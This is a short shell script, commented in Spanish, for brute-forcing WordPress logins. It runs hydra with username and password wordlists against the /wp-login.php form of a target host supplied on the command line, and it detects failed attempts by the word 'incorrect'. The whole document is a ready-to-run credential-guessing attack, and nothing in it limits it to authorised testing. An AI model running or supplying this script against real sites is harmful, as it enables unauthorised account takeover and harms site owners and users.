# Script basico para fuerza bruta http con hydra en  WordPress version 6.9
# Uso.: sh brutehttp8.sh fqdn
# 
#
hydra -L usuarios0.txt -P claves0.txt $1 $2 http-post-form \
"/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=incorrect"
